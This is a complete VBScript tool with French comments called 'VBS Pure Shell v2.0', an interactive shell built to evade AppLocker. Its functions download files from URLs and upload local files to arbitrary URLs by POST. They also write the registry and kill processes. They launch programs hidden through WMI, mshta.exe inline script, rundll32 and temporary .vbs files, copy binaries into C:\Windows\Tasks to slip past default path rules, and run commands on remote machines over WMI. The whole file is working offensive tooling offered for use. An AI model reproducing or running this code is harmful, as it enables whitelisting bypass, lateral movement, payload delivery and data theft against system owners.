Option Explicit

' =========================================================
'  VBS PURE SHELL v2.0
'  - Aucun appel direct à cmd.exe / powershell.exe
'  - Multi-méthodes d'exécution (bypass AppLocker)
'  - Lancement :
'      cscript.exe //NoLogo pureshell.vbs    (console)
'      wscript.exe pureshell.vbs             (GUI InputBox)
' =========================================================

Dim g_Shell, g_FSO, g_Net, g_WMI, g_GUI
Set g_Shell = CreateObject("WScript.Shell")
Set g_FSO   = CreateObject("Scripting.FileSystemObject")
Set g_Net   = CreateObject("WScript.Network")
Set g_WMI   = GetObject("winmgmts:\\.\root\cimv2")

g_GUI = (InStr(LCase(WScript.FullName), "wscript.exe") > 0)

' =========================================================
'  HELPERS
' =========================================================

Function WMISpawn(cmdLine)
    ' Lance une commande via WMI, retourne le PID ou "[ERR] ..."
    Dim startup, process, pid
    On Error Resume Next
    Set startup = g_WMI.Get("Win32_ProcessStartup").SpawnInstance_
    startup.ShowWindow = 0
    Set process = g_WMI.Get("Win32_Process")
    process.Create cmdLine, Null, startup, pid
    If Err.Number <> 0 Then
        WMISpawn = "[ERR] " & Err.Description
        Err.Clear
    Else
        WMISpawn = "PID " & pid
    End If
End Function

Function SplitFirst(s)
    ' Retourne Array(premier_mot, reste)
    Dim p, r(1)
    s = Trim(s)
    p = InStr(s, " ")
    If p = 0 Then
        r(0) = s : r(1) = ""
    Else
        r(0) = Left(s, p - 1) : r(1) = Trim(Mid(s, p + 1))
    End If
    SplitFirst = r
End Function

' =========================================================
'  COMMANDES — Système & fichiers
' =========================================================

Function Cmd_Whoami()
    Cmd_Whoami = g_Net.UserDomain & "\" & g_Net.UserName & _
                 " @ " & g_Net.ComputerName
End Function

Function Cmd_Hostname()
    Cmd_Hostname = g_Net.ComputerName
End Function

Function Cmd_Pwd()
    Cmd_Pwd = g_Shell.CurrentDirectory
End Function

Function Cmd_Cd(path)
    On Error Resume Next
    If path = "" Then Cmd_Cd = g_Shell.CurrentDirectory : Exit Function
    g_Shell.CurrentDirectory = path
    If Err.Number <> 0 Then
        Cmd_Cd = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_Cd = "OK -> " & g_Shell.CurrentDirectory
    End If
End Function

Function Cmd_Dir(path)
    Dim folder, f, out
    If path = "" Then path = g_Shell.CurrentDirectory
    On Error Resume Next
    Set folder = g_FSO.GetFolder(path)
    If Err.Number <> 0 Then
        Cmd_Dir = "[ERR] Chemin invalide: " & path : Err.Clear : Exit Function
    End If
    out = "Contenu de " & folder.Path & vbCrLf & String(60, "-") & vbCrLf
    For Each f In folder.SubFolders
        out = out & "<DIR>       " & f.Name & vbCrLf
    Next
    For Each f In folder.Files
        out = out & Right("            " & f.Size, 12) & "  " & f.Name & vbCrLf
    Next
    Cmd_Dir = out
End Function

Function Cmd_Type(file)
    Dim ts, out
    On Error Resume Next
    Set ts = g_FSO.OpenTextFile(file, 1)
    If Err.Number <> 0 Then
        Cmd_Type = "[ERR] " & Err.Description : Err.Clear : Exit Function
    End If
    out = ts.ReadAll
    ts.Close
    Cmd_Type = out
End Function

Function Cmd_Del(file)
    On Error Resume Next
    g_FSO.DeleteFile file, True
    If Err.Number <> 0 Then
        Cmd_Del = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_Del = "OK -> supprimé: " & file
    End If
End Function

Function Cmd_Copy(src, dst)
    On Error Resume Next
    g_FSO.CopyFile src, dst, True
    If Err.Number <> 0 Then
        Cmd_Copy = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_Copy = "OK -> " & src & " -> " & dst
    End If
End Function

' =========================================================
'  COMMANDES — Réseau
' =========================================================

Function Cmd_Ipconfig()
    Dim items, item, out
    On Error Resume Next
    Set items = g_WMI.ExecQuery( _
        "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
    For Each item In items
        out = out & "=== " & item.Description & " ===" & vbCrLf
        out = out & "  MAC     : " & item.MACAddress & vbCrLf
        If Not IsNull(item.IPAddress) Then _
            out = out & "  IP      : " & Join(item.IPAddress, ", ") & vbCrLf
        If Not IsNull(item.DefaultIPGateway) Then _
            out = out & "  Gateway : " & Join(item.DefaultIPGateway, ", ") & vbCrLf
        If Not IsNull(item.DNSServerSearchOrder) Then _
            out = out & "  DNS     : " & Join(item.DNSServerSearchOrder, ", ") & vbCrLf
        out = out & vbCrLf
    Next
    Cmd_Ipconfig = out
End Function

Function Cmd_Download(url, dst)
    Dim http, stream
    On Error Resume Next
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send
    If Err.Number <> 0 Or http.Status <> 200 Then
        Cmd_Download = "[ERR] HTTP " & http.Status & " " & Err.Description
        Err.Clear : Exit Function
    End If
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 : stream.Open
    stream.Write http.responseBody
    stream.SaveToFile dst, 2
    stream.Close
    Cmd_Download = "OK -> " & dst & " (" & LenB(http.responseBody) & " octets)"
End Function

Function Cmd_Upload(file, url)
    Dim http, stream, data
    On Error Resume Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 : stream.Open
    stream.LoadFromFile file
    data = stream.Read
    stream.Close
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/octet-stream"
    http.setRequestHeader "X-Filename", g_FSO.GetFileName(file)
    http.Send data
    If Err.Number <> 0 Then
        Cmd_Upload = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_Upload = "OK -> POST " & http.Status & " (" & LenB(data) & " octets)"
    End If
End Function

' =========================================================
'  COMMANDES — Process & Registre
' =========================================================

Function Cmd_Ps()
    Dim items, p, out
    Set items = g_WMI.ExecQuery("SELECT ProcessId,Name,ExecutablePath FROM Win32_Process")
    out = "PID      NAME                      PATH" & vbCrLf & String(70, "-") & vbCrLf
    For Each p In items
        out = out & Right("       " & p.ProcessId, 7) & "  " & _
              Left(p.Name & String(25, " "), 25) & " " & _
              CStr(p.ExecutablePath) & vbCrLf
    Next
    Cmd_Ps = out
End Function

Function Cmd_Kill(pid)
    Dim items, p
    On Error Resume Next
    Set items = g_WMI.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId=" & pid)
    For Each p In items
        p.Terminate()
        Cmd_Kill = "OK -> PID " & pid & " terminé"
        Exit Function
    Next
    Cmd_Kill = "[ERR] PID introuvable"
End Function

Function Cmd_RegRead(key)
    On Error Resume Next
    Dim v : v = g_Shell.RegRead(key)
    If Err.Number <> 0 Then
        Cmd_RegRead = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_RegRead = key & " = " & CStr(v)
    End If
End Function

Function Cmd_RegWrite(key, val, typ)
    On Error Resume Next
    If typ = "" Then typ = "REG_SZ"
    g_Shell.RegWrite key, val, typ
    If Err.Number <> 0 Then
        Cmd_RegWrite = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_RegWrite = "OK -> " & key & " = " & val & " (" & typ & ")"
    End If
End Function

' =========================================================
'  COMMANDES — Exécution (bypass AppLocker)
' =========================================================

Function Cmd_Run(binary, args)
    ' WMI direct
    Dim cmd, r
    cmd = binary
    If args <> "" Then cmd = cmd & " " & args
    r = WMISpawn(cmd)
    Cmd_Run = "run (WMI)       -> " & r
End Function

Function Cmd_RunShell(binary, args)
    ' Shell.Application → parent devient explorer.exe
    Dim sa
    On Error Resume Next
    Set sa = CreateObject("Shell.Application")
    sa.ShellExecute binary, args, "", "open", 0
    If Err.Number <> 0 Then
        Cmd_RunShell = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_RunShell = "OK -> " & binary & " (Shell.Application, parent=explorer)"
    End If
End Function

Function Cmd_RunMshta(vbCode)
    ' VBS inline via mshta.exe (LOLBin signé MS)
    Dim payload, r
    payload = "mshta.exe vbscript:Execute(""" & _
              Replace(vbCode, """", """""") & ":close"")"
    r = WMISpawn(payload)
    Cmd_RunMshta = "runmshta        -> " & r
End Function

Function Cmd_RunDll(binary, args)
    ' rundll32 + shell32.ShellExec_RunDLL
    Dim cmd, r
    cmd = "rundll32.exe shell32.dll,ShellExec_RunDLL " & binary
    If args <> "" Then cmd = cmd & " " & args
    r = WMISpawn(cmd)
    Cmd_RunDll = "rundll          -> " & r
End Function

Function Cmd_RunVbs(vbCode)
    ' Écrit un .vbs temporaire et l'exécute via cscript
    Dim tmp, ts, r
    tmp = g_Shell.ExpandEnvironmentStrings("%TEMP%") & _
          "\_" & Hex(CLng(Timer * 1000)) & ".vbs"
    On Error Resume Next
    Set ts = g_FSO.CreateTextFile(tmp, True)
    ts.Write vbCode
    ts.Close
    If Err.Number <> 0 Then
        Cmd_RunVbs = "[ERR] Write: " & Err.Description : Err.Clear : Exit Function
    End If
    r = WMISpawn("cscript.exe //NoLogo //B """ & tmp & """")
    Cmd_RunVbs = "runvbs          -> " & r & " (" & tmp & ")"
End Function

Function Cmd_RunBypass(srcBinary)
    ' Copie dans C:\Windows\Tasks (bypass chemin AppLocker par défaut)
    Dim dst, r
    On Error Resume Next
    dst = "C:\Windows\Tasks\" & g_FSO.GetFileName(srcBinary)
    g_FSO.CopyFile srcBinary, dst, True
    If Err.Number <> 0 Then
        Cmd_RunBypass = "[ERR] Copy: " & Err.Description : Err.Clear : Exit Function
    End If
    r = WMISpawn(dst)
    Cmd_RunBypass = "runbypass       -> " & r & " (" & dst & ")"
End Function

Function Cmd_RunRemote(target, cmdLine)
    ' WMI remote sur une autre machine (nécessite creds/admin)
    Dim objLocator, objSvc, startup, process, pid
    On Error Resume Next
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objSvc = objLocator.ConnectServer(target, "root\cimv2")
    objSvc.Security_.ImpersonationLevel = 3
    Set startup = objSvc.Get("Win32_ProcessStartup").SpawnInstance_
    startup.ShowWindow = 0
    Set process = objSvc.Get("Win32_Process")
    process.Create cmdLine, Null, startup, pid
    If Err.Number <> 0 Then
        Cmd_RunRemote = "[ERR] " & Err.Description : Err.Clear
    Else
        Cmd_RunRemote = "OK -> " & target & " PID " & pid
    End If
End Function

' =========================================================
'  AIDE
' =========================================================

Function Cmd_Help()
    Cmd_Help = _
    "=== VBS Pure Shell v2.0 — commandes ===" & vbCrLf & _
    " [Système]" & vbCrLf & _
    "   whoami                     User courant" & vbCrLf & _
    "   hostname                   Nom machine" & vbCrLf & _
    "   pwd                        Répertoire courant" & vbCrLf & _
    "   cd <path>                  Change de répertoire" & vbCrLf & _
    "   dir|ls [path]              Liste fichiers" & vbCrLf & _
    "   type|cat <file>            Affiche un fichier" & vbCrLf & _
    "   del <file>                 Supprime un fichier" & vbCrLf & _
    "   copy <src> <dst>           Copie un fichier" & vbCrLf & _
    " [Réseau]" & vbCrLf & _
    "   ipconfig                   Config réseau" & vbCrLf & _
    "   download <url> <dst>       Télécharge un fichier" & vbCrLf & _
    "   upload <file> <url>        POST un fichier" & vbCrLf & _
    " [Process/Registre]" & vbCrLf & _
    "   ps|tasklist                Liste processus" & vbCrLf & _
    "   kill <pid>                 Tue un processus" & vbCrLf & _
    "   regread <key>              Lit le registre" & vbCrLf & _
    "   regwrite <key> <val> [type] Écrit le registre" & vbCrLf & _
    " [Exécution — bypass AppLocker]" & vbCrLf & _
    "   run <bin> [args]           WMI direct" & vbCrLf & _
    "   runshell <bin> [args]      Via Shell.Application (parent=explorer)" & vbCrLf & _
    "   runmshta <vbcode>          VBS inline via mshta.exe" & vbCrLf & _
    "   rundll <bin> [args]        Via rundll32+shell32" & vbCrLf & _
    "   runvbs <vbcode>            .vbs temp + cscript" & vbCrLf & _
    "   runbypass <bin>            Copie dans C:\Windows\Tasks + exec" & vbCrLf & _
    "   runremote <host> <cmd>     WMI remote" & vbCrLf & _
    " [Divers]" & vbCrLf & _
    "   help                       Cette aide" & vbCrLf & _
    "   exit | quit                Quitter"
End Function

' =========================================================
'  PARSER
' =========================================================

Function ParseAndExec(input)
    Dim parts, cmd, rest, sub1, a1, a2
    input = Trim(input)
    If input = "" Then ParseAndExec = "" : Exit Function
    
    parts = SplitFirst(input)
    cmd   = LCase(parts(0))
    rest  = parts(1)
    
    ' Séparation args si besoin
    sub1 = SplitFirst(rest)
    a1   = sub1(0)
    a2   = sub1(1)
    
    Select Case cmd
        Case "whoami"              : ParseAndExec = Cmd_Whoami()
        Case "hostname"            : ParseAndExec = Cmd_Hostname()
        Case "pwd"                 : ParseAndExec = Cmd_Pwd()
        Case "cd"                  : ParseAndExec = Cmd_Cd(rest)
        Case "dir", "ls"           : ParseAndExec = Cmd_Dir(rest)
        Case "type", "cat"         : ParseAndExec = Cmd_Type(rest)
        Case "del", "rm"           : ParseAndExec = Cmd_Del(rest)
        Case "copy", "cp"          : ParseAndExec = Cmd_Copy(a1, a2)
        Case "ipconfig", "ifconfig": ParseAndExec = Cmd_Ipconfig()
        Case "download"            : ParseAndExec = Cmd_Download(a1, a2)
        Case "upload"              : ParseAndExec = Cmd_Upload(a1, a2)
        Case "ps", "tasklist"      : ParseAndExec = Cmd_Ps()
        Case "kill"                : ParseAndExec = Cmd_Kill(rest)
        Case "regread"             : ParseAndExec = Cmd_RegRead(rest)
        Case "regwrite"
            Dim sub2 : sub2 = SplitFirst(a2)
            ParseAndExec = Cmd_RegWrite(a1, sub2(0), sub2(1))
        Case "run"                 : ParseAndExec = Cmd_Run(a1, a2)
        Case "runshell"            : ParseAndExec = Cmd_RunShell(a1, a2)
        Case "runmshta"            : ParseAndExec = Cmd_RunMshta(rest)
        Case "rundll"              : ParseAndExec = Cmd_RunDll(a1, a2)
        Case "runvbs"              : ParseAndExec = Cmd_RunVbs(rest)
        Case "runbypass"           : ParseAndExec = Cmd_RunBypass(rest)
        Case "runremote"           : ParseAndExec = Cmd_RunRemote(a1, a2)
        Case "help", "?"           : ParseAndExec = Cmd_Help()
        Case Else                  : ParseAndExec = "[?] Commande inconnue: " & cmd & " (tape 'help')"
    End Select
End Function

' =========================================================
'  REPL — Mode console (cscript)
' =========================================================

Sub REPL_Console()
    Dim input, output
    WScript.Echo "VBS Pure Shell v2.0 — tape 'help' pour l'aide, 'exit' pour quitter."
    Do
        WScript.StdOut.Write "[" & g_Shell.CurrentDirectory & "]> "
        input = WScript.StdIn.ReadLine()
        If LCase(Trim(input)) = "exit" Or LCase(Trim(input)) = "quit" Then Exit Do
        output = ParseAndExec(input)
        If Len(output) > 0 Then WScript.Echo output
    Loop
    WScript.Echo "Bye."
End Sub

' =========================================================
'  REPL — Mode GUI (wscript, InputBox)
' =========================================================

Sub REPL_GUI()
    Dim input, output, history
    history = "VBS Pure Shell v2.0 (GUI)" & vbCrLf & _
              "Tape 'help' pour l'aide, 'exit' pour quitter." & vbCrLf & vbCrLf
    Do
        input = InputBox(history & vbCrLf & "[" & g_Shell.CurrentDirectory & "]>", _
                         "VBS Pure Shell", "")
        If IsEmpty(input) Then Exit Do
        If LCase(Trim(input)) = "exit" Or LCase(Trim(input)) = "quit" Then Exit Do
        output = ParseAndExec(input)
        If Len(output) > 0 Then
            MsgBox output, vbInformation, "Résultat: " & input
            history = "[" & input & "]" & vbCrLf & Left(output, 500) & vbCrLf & vbCrLf
        End If
    Loop
End Sub

' =========================================================
'  ENTRY POINT
' =========================================================

If g_GUI Then
    REPL_GUI()
Else
    REPL_Console()
End If

Set g_Shell = Nothing
Set g_FSO   = Nothing
Set g_Net   = Nothing
Set g_WMI   = Nothing
